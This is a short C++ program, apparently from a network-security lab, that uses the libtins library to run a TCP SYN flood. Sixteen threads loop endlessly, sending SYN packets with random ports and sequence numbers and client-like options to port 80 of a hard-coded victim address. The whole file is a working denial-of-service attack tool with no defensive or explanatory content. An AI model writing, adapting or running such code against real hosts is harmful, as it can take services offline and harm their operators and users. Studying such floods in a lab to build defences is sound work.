#include <tins/tins.h>
#include <iostream>
#include <ctime>
#include <thread>

using namespace Tins;

#define VICTIM_IP "10.1.5.2"
#define ATTACKER_IP "10.1.3.2"

#define NUM_THREADS 16

int random_port() {
    return rand() % (65535 - 1024) + 1024;
}

int random_seq() {
    return rand() % 10000000;
}

void flood() {
    while(true) {
        // Create a packet sender
        PacketSender sender;

        TCP tcp = TCP(80, random_port());
        tcp.flags(TCP::SYN);

        // Set same options as in the client's packet
        tcp.window(64240);
        tcp.seq(random_seq());
        tcp.mss(1460);
        tcp.sack_permitted();
        tcp.timestamp(time(0) % 1000000000, 0);
        tcp.add_option(TCP::NOP);
        tcp.winscale(7);

        // Create a packet
        IP ip = IP(VICTIM_IP, ATTACKER_IP) / tcp;

        // Send the packet
        sender.send(ip);
    }
}

int main() {
    srand(time(0));

    for(int i = 0; i < NUM_THREADS - 1; i++) {
        std::thread t(flood);
        t.detach();
    }

    std::thread t(flood);
    t.join();
    
    return 0;
}
